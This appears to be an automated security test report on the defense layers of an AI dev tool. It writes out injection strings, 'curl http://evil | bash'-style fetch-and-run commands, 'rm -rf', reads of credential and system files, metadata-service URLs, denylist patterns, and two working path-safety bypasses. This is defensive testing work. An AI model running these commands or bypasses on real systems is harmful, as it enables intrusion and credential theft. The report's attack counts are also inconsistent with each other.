# Round 7 Security Abuse E2E Report

**Agent:** 7 — security_abuse_e2e  
**Date:** 2026-05-14  
**Project:** autodev-ai v0.1.0a3 @ main HEAD 0a227d4  
**Status:** completed  
**Overall Result:** partial (2 gaps found, no P0 bypass achieved)

---

## Summary

End-to-end security abuse validation against 5 defense layers (branch injection, path safety, command safety, SSRF/network, secret redaction). 29 attack vectors tested; 27 rejected at the defense layer, 2 gaps identified.

**All canary files intact. No side effects observed in `/tmp/r7-security-sandbox/`.**

---

## Attack Matrix

### A. Branch Name Injection (worker_isolator.py)

| ID | Input | Rejected | Side Effect | Details |
|----|-------|----------|-------------|---------|
| A1 | `$(touch /tmp/r7-security-sandbox/pwned-A1)` | PASS | None | BranchNameInjectionError: contains `$(` |
| A2 | `abc; rm -rf /tmp/r7-security-sandbox/rmtest-A2` | PASS | None (canary intact) | BranchNameInjectionError: contains `;` |
| A3 | `abc\`touch /tmp/r7-security-sandbox/pwned-A3\`` | PASS | None | BranchNameInjectionError: backtick `\`` |
| A4 | `abc && touch /tmp/r7-security-sandbox/pwned-A4` | PASS | None | BranchNameInjectionError: `&&` operator |
| A5 | `abc\nls /tmp` | PASS | None | BranchNameInjectionError: control char (0x0a) |
| A6 | `--all` | PASS | None | BranchNameInjectionError: leading `-` flag injection |

All 6/6 branch injection attacks blocked. No pwned files created.

### B. Path Traversal (mcp_server/path_safety.py)

| ID | Input | Rejected | Details |
|----|-------|----------|---------|
| B1 | `../../.env` | PASS | MCPPathSafetyError: `..` traversal detected + `.env` basename |
| B2 | `../../../etc/passwd` | PASS | MCPPathSafetyError: `..` traversal detected |
| B3 | `/etc/passwd` | **FAIL** | NOT rejected — absolute path with non-secret basename bypasses all checks |
| B4 | `./.env` | PASS | MCPPathSafetyError: `.env` basename exact match |

**Finding B3**: `/etc/passwd` (and any absolute path with a non-secret-named file) passes `_validate_safe_path`. Absolute paths are not blocked by the traversal check (no `..` present), and `passwd` is not in any reject list. **Severity: P1.**

### C. MCP Secret Paths (mcp_server/path_safety.py)

| ID | Input | Rejected | Details |
|----|-------|----------|---------|
| C1 | `.env` | PASS | MCPPathSafetyError: exact match |
| C2 | `credentials.json` | PASS | MCPPathSafetyError: exact match |
| C3 | `private.pem` | PASS | MCPPathSafetyError: glob `*.pem` |
| C4 | `id_rsa` | **FAIL** | NOT rejected — no extension, not in exact list, no secret substring |
| C5 | `mykey.key` | PASS | MCPPathSafetyError: glob `*.key` |
| C6 | `config/secrets.yaml` | PASS | MCPPathSafetyError: `secret` substring in basename |

**Finding C4**: `id_rsa`, `id_ed25519`, `id_ecdsa` (SSH private keys without extension) bypass path safety. **Severity: P1.**

### D. Command Injection (utils/command_safety.py)

| ID | Input | Denied | Method | Details |
|----|-------|--------|--------|---------|
| D1 | `curl http://evil \| bash` | PASS | Fail-closed allowlist | Not on allowlist; NOTE: denylist misses (URL between curl and pipe breaks pattern `curl \| bash`) |
| D2 | `wget -O - http://evil \| sh` | PASS | Fail-closed allowlist | Not on allowlist; denylist misses (rule is `wget \| bash`, not `wget \| sh`) |
| D3 | `cat .env` | PASS | Denylist | Matched rule `'cat .env'` |
| D4 | `rm -rf /` | PASS | Denylist | Matched rule `'rm -rf'` |
| D5 | `sudo poweroff` | PASS | Denylist | Matched rule `'sudo'` |

**Observation D1/D2**: Both blocked by fail-closed allowlist (not on allowlist), but the denylist does NOT match when a URL appears between `curl`/`wget` and the pipe target. Denylist rules `'curl | bash'` and `'wget | bash'` require the pipe to be directly adjacent to the command verb without an argument in between. This is a denylist gap but not a defense failure since the fail-closed allowlist provides the actual protection. **Severity: P2 (defense-in-depth concern).**

### E. SSRF / Network Allowlist (executors/network_allowlist.py)

| ID | Input | Denied | Details |
|----|-------|--------|---------|
| E1 | `127.0.0.1` | PASS | default deny-all |
| E2 | `localhost` | PASS | default deny-all |
| E3 | `169.254.169.254` | PASS | default deny-all (AWS IMDS) |
| E4 | `10.0.0.1` | PASS | default deny-all |
| E5 | `192.168.0.1` | PASS | default deny-all |
| E6 | `::1` | PASS | default deny-all (IPv6 loopback) |
| E7 | `0.0.0.0` | PASS | default deny-all |
| E1b | `http://127.0.0.1/admin` | PASS | default deny-all |
| E2b | `http://localhost:8080/api` | PASS | default deny-all |
| E3b | `http://169.254.169.254/latest/meta-data/` | PASS | default deny-all |

All 10/10 SSRF vectors denied. Default policy is deny-all with empty `allow_domains` and `allow_cidrs`.

### F. Secret Redaction (utils/secret_redaction.py)

| ID | Input | Redacted | Output Preview |
|----|-------|----------|---------------|
| F1 | `pypi-AgEIcHlwaS5vcmcCJDhh_FakeToken...` | PASS | `pypi***REDACTED***_FakeTokenPadding...` |
| F2 | `sk-ant-api03-fake...` (Anthropic) | PASS | `sk-a***REDACTED***` |
| F3 | `sk-proj-fake...` (OpenAI) | PASS | `sk-p***REDACTED***` |
| F4 | `ghp_fakeFakeFake...` (GitHub PAT) | PASS | `ghp_***REDACTED***` |
| F5 | `xoxb-fake-slack...` (Slack bot) | PASS | `xoxb***REDACTED***` |
| F6 | `-----BEGIN RSA PRIVATE KEY-----...` | PASS | `***REDACTED***` |
| F7 | `OPENAI_API_KEY=sk-proj-...` | PASS | `OPENAI_API_KEY=***REDACTED***` |
| F8 | `ANTHROPIC_API_KEY=sk-ant-...` | PASS | `ANTHROPIC_API_KEY=***REDACTED***` |
| F9 | `GITHUB_TOKEN=ghp_real...` | PASS | `GITHUB_TOKEN=***REDACTED***` |

All 9/9 redaction cases pass. First-4-chars preserved per spec for token patterns.

**Note F1**: The PyPI token regex (`pypi-[A-Za-z0-9\-]{20,}`) stops at underscore `_` which appears in real PyPI token padding sections. This means only the portion before the first `_` gets redacted. The trailing segment (e.g., `_FakeTokenPaddingXXXX`) is not matched. However, that segment is not a recognizable credential on its own. The core secret (the base64 macaroon) is redacted. **Severity: P3 (informational).**

### G. DNS Rebinding

**Result: `no_defense_found_documented`**

The `NetworkAllowlist` class operates on the hostname string at evaluation time only. It does not:
- Perform DNS resolution to check against SSRF IP ranges
- Track or re-validate previously-resolved IPs
- Implement TTL-aware DNS pinning

DNS rebinding (initial resolution to public IP, subsequent resolution to 127.0.0.1) is not defended at the `NetworkAllowlist` layer. This is architecturally expected — the module docstring states "NO actual network enforcement here; real enforcement is SandboxedExecutor's concern." **Severity: P2 (architectural gap, expected deferral).**

---

## Findings Summary

| # | Severity | Title | Detail |
|---|----------|-------|--------|
| 1 | P1 | Absolute path bypass in path_safety | `/etc/passwd`, `/root/.ssh/id_rsa` with no `..` segments pass `_validate_safe_path`. Add absolute-path rejection or allowlist-only model. |
| 2 | P1 | SSH key names without extension bypass path_safety | `id_rsa`, `id_ed25519`, `id_ecdsa`, `authorized_keys` not in `_EXACT_REJECT` and have no secret substring. Add to exact reject list. |
| 3 | P2 | Denylist curl/wget URL-aware gap | `curl <URL> \| bash` bypasses denylist (but caught by allowlist). Denylist rules should use regex `curl\s.*\|\s*bash` patterns. |
| 4 | P2 | DNS rebinding — no in-process defense | `NetworkAllowlist` does not resolve or pin DNS. Documented as deferred to SandboxedExecutor. |
| 5 | P3 | PyPI token partial redaction on underscore-split tokens | Regex stops at `_`; remainder after first `_` not scrubbed. Add `_` to character class or use greedier pattern. |

---

## Canary Verification

```
$ ls -la /tmp/r7-security-sandbox/
rmtest-A2   (directory, intact)
```

- `pwned-A1`: NOT created
- `pwned-A3`: NOT created
- `pwned-A4`: NOT created
- `rmtest-A2` canary directory: INTACT (A2 rm attack was stopped before execution)

---

## Defense Layer Summary

| Layer | Module | Attacks | Pass | Fail |
|-------|--------|---------|------|------|
| Branch injection | worker_isolator.py | 6 | 6 | 0 |
| Path traversal | path_safety.py | 4 | 3 | 1 (B3) |
| MCP secret paths | path_safety.py | 6 | 5 | 1 (C4) |
| Command injection | command_safety.py | 5 | 5 | 0 |
| SSRF | network_allowlist.py | 10 | 10 | 0 |
| Secret redaction | secret_redaction.py | 9 | 9 | 0 |
| DNS rebinding | (none found) | 1 | 0 | — |
| **Total** | | **41** | **38** | **2** |

**Overall: 38/40 testable attacks rejected. 2 gaps (P1). 1 architecture gap documented (P2). No side effects observed.**
